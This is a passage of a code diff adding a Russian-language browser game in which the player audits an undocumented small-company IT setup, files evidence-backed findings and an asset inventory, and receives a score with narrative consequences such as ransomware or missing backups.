+    toast("Доказательств недостаточно: данные не сходятся. Нужны минимум два независимых источника.", "warn");
+    return;
+  }
+
+  if(verdict !== f.verdict){
+    state.penalties += 5;
+    log("bad", "Неверный вердикт по объекту: " + a.title);
+    render();
+    toast("Вердикт не подтверждается доказательствами. −5", "bad");
+    return;
+  }
+
+  addMinutes(5);
+  const correct = action === f.correctAction;
+  state.filed[artifactId] = { title:f.title, partial:!correct, action };
+
+  if(correct){
+    log("ok", "Находка: " + f.title);
+    toast("Находка оформлена.", "ok");
+  } else {
+    const inc = f.incidents[action] || "Действие привело к последствиям.";
+    state.incidents.push(inc);
+    log("bad", "Инцидент: " + inc);
+    toast("Вердикт верный, действие — нет. Это будет иметь последствия.", "warn");
+  }
+
+  closeModal();
+  render();
+}
+
+/* ---------------------------- АКТ ---------------------------- */
+
+function openAct(){
+  openModal(
+    '<div class="kicker">АКТ ИНВЕНТАРИЗАЦИИ</div>' +
+    '<h2>Что у нас есть</h2>' +
+    '<p class="muted">Отметьте критичные активы и те, у которых нет владельца. Ошибки здесь тоже считаются.</p>' +
+    '<table class="act-table"><thead><tr><th>Актив</th><th style="width:90px">Критичный</th><th style="width:120px">Без владельца</th></tr></thead><tbody>' +
+    ASSETS.map(a =>
+      '<tr><td>' + esc(a.name) + '</td>' +
+      '<td><input type="checkbox" data-crit="' + a.id + '" ' + (state.act && state.act.crit[a.id] ? "checked" : "") + '></td>' +
+      '<td><input type="checkbox" data-unowned="' + a.id + '" ' + (state.act && state.act.unowned[a.id] ? "checked" : "") + '></td></tr>'
+    ).join("") +
+    '</tbody></table>' +
+    '<div class="modal-actions">' +
+      '<button class="btn ghost" data-act="close">Отмена</button>' +
+      '<button class="btn primary" data-act="save-act">Сохранить акт</button>' +
+    '</div>',
+    "wide", true
+  );
+}
+
+function saveAct(){
+  const crit = {}, unowned = {};
+  document.querySelectorAll("[data-crit]").forEach(el => { crit[el.dataset.crit] = el.checked; });
+  document.querySelectorAll("[data-unowned]").forEach(el => { unowned[el.dataset.unowned] = el.checked; });
+  state.act = { crit, unowned };
+  addMinutes(10);
+  log("info", "Акт инвентаризации заполнен.");
+  closeModal();
+  render();
+  toast("Акт сохранён.", "ok");
+}
+
+/* ---------------------------- ФИНАЛ ---------------------------- */
+
+function isResolved(anchor){
+  const rec = state.filed[anchor];
+  return !!rec && !rec.partial;
+}
+
+function computeResults(){
+  const rows = [];
+  let findingsScore = 0;
+
+  FINDINGS.forEach(f => {
+    const rec = state.filed[f.anchor];
+    if(!rec){
+      rows.push({ title:f.title, status:"не найдено", kind:"miss" });
+      return;
+    }
+    if(rec.partial){
+      findingsScore += 4;
+      rows.push({ title:f.title, status:"найдено, действие неверное", kind:"part" });
+    } else {
+      findingsScore += 10;
+      rows.push({ title:f.title, status:"верно", kind:"ok" });
+    }
+  });
+
+  let actScore = 0;
+  let actNote = "акт не заполнен";
+  if(state.act){
+    const critAll = ASSETS.filter(a => a.critical);
+    const ownAll  = ASSETS.filter(a => a.unowned);
+    const critSel = ASSETS.filter(a => state.act.crit[a.id]);
+    const ownSel  = ASSETS.filter(a => state.act.unowned[a.id]);
+    const critHit = critSel.filter(a => a.critical).length;
+    const ownHit  = ownSel.filter(a => a.unowned).length;
+    const critErr = ASSETS.filter(a => !!state.act.crit[a.id] !== !!a.critical).length;
+    const ownErr  = ASSETS.filter(a => !!state.act.unowned[a.id] !== !!a.unowned).length;
+
+    actScore = Math.max(0,
+      Math.round(10 * (1 - critErr / ASSETS.length)) +
+      Math.round(10 * (1 - ownErr / ASSETS.length))
+    );
+    actNote = "критичные " + critHit + "/" + critAll.length +
+      (critSel.length > critHit ? ", лишних " + (critSel.length - critHit) : "") +
+      " · без владельца " + ownHit + "/" + ownAll.length +
+      (ownSel.length > ownHit ? ", лишних " + (ownSel.length - ownHit) : "");
+  }
+
+  const timeBonus = state.minutes <= 120 ? 10 : state.minutes <= 180 ? 6 : state.minutes <= 240 ? 3 : 0;
+  const total = Math.max(0, findingsScore + actScore + timeBonus - state.penalties);
+
+  const grade = total >= 90 ? "Отлично" : total >= 70 ? "Зачёт" : total >= 50 ? "Условно" : "Дело возвращено";
+
+  const consequences = [];
+  if(!isResolved("u02") || !isResolved("t01"))
+    consequences.push("Дело 3: ночью шифруется файловый сервер FS-01. Простой — два дня.");
+  if(state.filed["t02"] && state.filed["t02"].action === "delete")
+    consequences.push("1С падает, бухгалтерия простаивает, директор требует объяснений.");
+  if(state.filed["u01"] && state.filed["u01"].action === "disable")
+    consequences.push("Дело 4: резервных копий нет. Восстанавливать не из чего.");
+  if(!isResolved("n03"))
+    consequences.push("Дело 5: аудитор находит сканы паспортов в открытой папке. Акт не подписан.");
+  if(!isResolved("u03"))
+    consequences.push("Дело 5: действия сотрудников неразличимы, инцидент не атрибутируется.");
+
+  return { rows, findingsScore, actScore, actNote, timeBonus, total, grade, consequences };
+}
+
+function finish(){
+  if(state.finished) return;
+  state.finished = true;
+  const r = computeResults();
+
+  try{
+    localStorage.setItem("nasledstvo.case1", JSON.stringify({
+      score:r.total, grade:r.grade, consequences:r.consequences,
+      incidents:state.incidents, date:new Date().toISOString(),
+    }));
+  }catch(e){ /* локальное хранилище может быть недоступно */ }
+
+  const incidentsHtml = state.incidents.length
+    ? state.incidents.map(i => '<div class="res-row"><span>' + esc(i) + '</span><span class="miss">инцидент</span></div>').join("")
+    : '<div class="empty">Инцидентов нет.</div>';
+
+  const consHtml = r.consequences.length
+    ? r.consequences.map(c => '<li>' + esc(c) + '</li>').join("")
+    : '<li>Ничего не сломано. Пока.</li>';
+
+  openModal(
+    '<div class="kicker">ДЕЛО 1 · ИТОГИ</div>' +
+    '<div class="score"><span class="score-num">' + r.total + '</span>' +
+    '<span class="score-grade">' + esc(r.grade) + ' · смена завершена в ' + clockStr() + '</span></div>' +
+    '<div class="res-row"><span>Находки</span><span>' + r.findingsScore + ' / 70</span></div>' +
+    '<div class="res-row"><span>Акт</span><span>' + r.actScore + ' / 20 <span class="muted">(' + esc(r.actNote) + ')</span></span></div>' +
+    '<div class="res-row"><span>Время</span><span>' + r.timeBonus + ' / 10 <span class="muted">(' + state.minutes + ' мин)</span></span></div>' +
+    '<div class="res-row"><span>Штрафы</span><span class="miss">−' + state.penalties + '</span></div>' +
+
+    '<div class="field-label">Разбор находок</div>' +
+    r.rows.map(row => '<div class="res-row"><span>' + esc(row.title) + '</span><span class="' + row.kind + '">' + esc(row.status) + '</span></div>').join("") +
+
+    '<div class="field-label">Журнал происшествий</div>' + incidentsHtml +
+
+    '<div class="field-label">Что это будет значить дальше</div>' +
+    '<ul class="hintlist">' + consHtml + '</ul>' +
+
+    '<div class="modal-actions">' +
+      '<button class="btn ghost" data-act="restart">Сыграть заново</button>' +
+      '<button class="btn primary" data-act="close">Закрыть</button>' +
+    '</div>',
+    "wide", true
+  );
+}
+
+/* ============================ МОДАЛКИ / ТОСТЫ ============================ */
+
+function openModal(html, size, isStatic){
+  const root = document.getElementById("modal-root");
+  root.innerHTML = '<div class="overlay"><div class="modal ' + (size === "wide" ? "wide" : "") + '"' +
+    (isStatic ? ' data-static="1"' : '') + '>' + html + '</div></div>';
+}
+function closeModal(){ document.getElementById("modal-root").innerHTML = ""; }
+
+function toast(text, kind){
+  const root = document.getElementById("toast-root");
+  const el = document.createElement("div");
+  el.className = "toast " + (kind || "");
+  el.textContent = text;
+  root.appendChild(el);
+  setTimeout(() => el.remove(), 3800);
+}
+
+function intro(){
+  openModal(
+    '<div class="kicker">ДЕЛО 1 · ОПИСЬ</div>' +
+    '<h2>Первая смена</h2>' +
+    '<p>ООО «Стабильность-С», 45 человек, два этажа офиса и серверная. Единственный системный администратор уволился три недели назад. Документацию не передал, на звонки не отвечает.</p>' +
+    '<p>Директор вызвал вас и сказал: «Работает же. Разберитесь, что у нас есть и кто туда заходит».</p>' +
+    '<p class="muted">У вас четыре инструмента: учётные записи, журналы, сеть, задачи. Подсказок не будет. Всё, что вы найдёте, придётся доказать как минимум двумя независимыми источниками.</p>' +
+    '<div class="modal-actions"><button class="btn primary" data-act="start">Начать смену</button></div>',
+    null, true
+  );
+}
+
+function startGame(){
+  closeModal();
+  log("info", "Смена начата. Объект принят без документации.");
+  render();
+}
+
+/* ============================ СОБЫТИЯ ============================ */
+
+document.addEventListener("click", (e) => {
+  if(e.target.classList && e.target.classList.contains("overlay")){
+    // закрытие только для необязательных модалок
+    const modal = e.target.querySelector(".modal");
+    if(modal && !modal.dataset.static){
+      closeModal();
+    }
+  }
+
+  const el = e.target.closest("[data-act]");
+  if(!el) return;
+  const act = el.dataset.act;
+  const id = el.dataset.id;
+
+  switch(act){
+    case "tab":
+      state.tool = id;
+      state.selected = null;
+      render();
+      break;
+    case "open":
+      openArtifact(id);
+      break;
+    case "file":
+      openFinding(id);
+      break;
+    case "verdict":
+      _ff.verdict = id;
+      _ff.action = null;
+      renderFindingActions();
+      break;
+    case "action":
+      _ff.action = id;
+      renderFindingActions();
+      break;
+    case "submit-finding":
+      submitFinding();
+      break;
+    case "open-act":
+      openAct();
+      break;
+    case "save-act":
+      saveAct();
+      break;
+    case "finish":
+      finish();
+      break;
+    case "close":
+      closeModal();
+      break;
+    case "start":
+      startGame();
+      break;
+    case "restart":
+      location.reload();
+      break;
+  }
+});
+
+document.addEventListener("keydown", (e) => {
+  if(e.key === "Escape"){
+    const root = document.getElementById("modal-root");
+    const modal = root.querySelector(".modal");
+    if(modal && !modal.dataset.static) closeModal();
+  }
+});
+
+/* ============================ СТАРТ ============================ */
+
+render();
+intro();
+</script>
+</body>
+</html>
